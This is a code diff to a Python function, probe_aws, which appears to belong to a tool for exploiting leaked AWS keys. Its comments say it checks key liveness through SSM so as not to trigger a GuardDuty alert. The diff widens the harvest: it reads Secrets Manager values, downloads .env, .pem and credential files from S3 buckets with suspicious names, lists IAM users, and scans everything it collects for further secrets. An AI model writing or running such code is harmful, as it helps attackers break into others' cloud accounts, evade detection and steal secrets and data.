@@ -827,36 +827,44 @@ async def probe_aws(cred: str) -> dict:
                           connect_timeout=8, read_timeout=10)
         REGION = "us-east-1"
 
+        text_blob: list[str] = []
+        susp: list[str] = []
+        services_tried: list[str] = []
+        service_alive_count = 0
+
         # Liveness probe via SSM (no GetCallerIdentity → no GuardDuty alert)
         ssm = boto3.client("ssm", aws_access_key_id=kid,
                             aws_secret_access_key=secret,
                             region_name=REGION, config=cfg)
+        ssm_alive = False
         try:
             ssm.describe_parameters(MaxResults=1)
+            ssm_alive = True
+            services_tried.append("ssm:ok")
+            service_alive_count += 1
         except ClientError as e:
             code = e.response.get("Error", {}).get("Code", "")
             if code in ("InvalidClientTokenId", "AuthFailure", "UnrecognizedClientException"):
                 return {"error": "invalid_token"}
-            # AccessDenied / SignatureDoesNotMatch = key real but no SSM perm
-            return {"error": "no_ssm_access", "code": code}
-        # Key is alive. Now enumerate.
+            # AccessDenied / SignatureDoesNotMatch = key real but no SSM perm.
+            # CONTINUE to other services — most leaked AWS keys have narrow IAM
+            # scopes (e.g. only SecretsManager:GetSecretValue, only s3:*).
+            services_tried.append(f"ssm:{code}")
 
-        text_blob: list[str] = []
-        susp: list[str] = []
-
-        # Full SSM enumeration — names only first
+        # Full SSM enumeration — only if alive
         ssm_count = 0
         param_names: list[str] = []
-        try:
-            for page in ssm.get_paginator("describe_parameters").paginate(
-                PaginationConfig={"MaxItems": 500}
-            ):
-                for p in page.get("Parameters", []):
-                    ssm_count += 1
-                    param_names.append(p.get("Name", ""))
-            out["ssm_params"] = ssm_count
-        except ClientError:
-            pass
+        if ssm_alive:
+            try:
+                for page in ssm.get_paginator("describe_parameters").paginate(
+                    PaginationConfig={"MaxItems": 500}
+                ):
+                    for p in page.get("Parameters", []):
+                        ssm_count += 1
+                        param_names.append(p.get("Name", ""))
+                out["ssm_params"] = ssm_count
+            except ClientError:
+                pass
 
         # Filter to suspicious names → only those get decrypted
         for name in param_names:
@@ -871,7 +879,7 @@ async def probe_aws(cred: str) -> dict:
             except ClientError:
                 pass
 
-        # Secrets Manager — same pattern
+        # Secrets Manager — independent IAM scope from SSM, ALWAYS try
         try:
             sm = boto3.client("secretsmanager", aws_access_key_id=kid,
                                aws_secret_access_key=secret,
@@ -883,6 +891,9 @@ async def probe_aws(cred: str) -> dict:
                 for s in page.get("SecretList", []):
                     out["sm_secrets"] += 1
                     secret_arns.append((s.get("Name", ""), s.get("ARN", "")))
+            if secret_arns:
+                services_tried.append("sm:ok")
+                service_alive_count += 1
             for name, arn in secret_arns:
                 # In SecretsManager the name is often abstract — read everything
                 # but cap at 50 to bound time. Filter by suspicious for read.
@@ -898,8 +909,9 @@ async def probe_aws(cred: str) -> dict:
                         text_blob.append(v)
                 except ClientError:
                     pass
-        except ClientError:
-            pass
+        except ClientError as e:
+            code = e.response.get("Error", {}).get("Code", "")
+            services_tried.append(f"sm:{code}")
 
         # S3 list (cheap, useful for bucket-name reporting)
         try:
@@ -907,12 +919,52 @@ async def probe_aws(cred: str) -> dict:
                                 aws_secret_access_key=secret, config=cfg)
             buckets = s3.list_buckets().get("Buckets", [])
             out["s3_buckets"] = len(buckets)
+            services_tried.append(f"s3:ok({len(buckets)})")
+            service_alive_count += 1
             for b in buckets[:30]:
                 bn = b.get("Name", "")
                 if any(k in bn.lower() for k in ("secret", "env", "config", "prod", "key", "credential")):
                     susp.append(f"s3:{bn}")
-        except ClientError:
-            pass
+                    # Try to download .env / config files from suspicious buckets
+                    try:
+                        objs = s3.list_objects_v2(Bucket=bn, MaxKeys=200).get("Contents", [])
+                        for o in objs[:50]:
+                            kn = o.get("Key", "")
+                            if any(p in kn.lower() for p in
+                                   (".env", "secret", "config", ".pem", "credential",
+                                    ".key", "vault", ".yaml", ".yml", ".json")):
+                                if o.get("Size", 0) < 524288:  # < 512 KB
+                                    try:
+                                        body = s3.get_object(Bucket=bn, Key=kn)["Body"].read()
+                                        text_blob.append(body.decode("utf-8", "replace"))
+                                    except ClientError:
+                                        pass
+                    except ClientError:
+                        pass
+        except ClientError as e:
+            code = e.response.get("Error", {}).get("Code", "")
+            services_tried.append(f"s3:{code}")
+
+        # IAM — list users/roles for context (no permission needed beyond list)
+        try:
+            iam = boto3.client("iam", aws_access_key_id=kid,
+                                 aws_secret_access_key=secret, config=cfg)
+            iam_users = iam.list_users(MaxItems=10).get("Users", [])
+            if iam_users:
+                services_tried.append(f"iam:ok({len(iam_users)})")
+                service_alive_count += 1
+                out["iam_users_count"] = len(iam_users)
+        except ClientError as e:
+            code = e.response.get("Error", {}).get("Code", "")
+            services_tried.append(f"iam:{code}")
+
+        out["services_tried"] = services_tried
+
+        # If NO service responded with auth-success, the key is broken-or-blocked.
+        # Otherwise it's alive even if scopes are limited.
+        if service_alive_count == 0:
+            return {"error": "no_service_access",
+                     "services_tried": services_tried}
 
         out["suspicious_tables"] = susp[:30]
         counts, previews, raw = _scan_text("\n".join(text_blob))
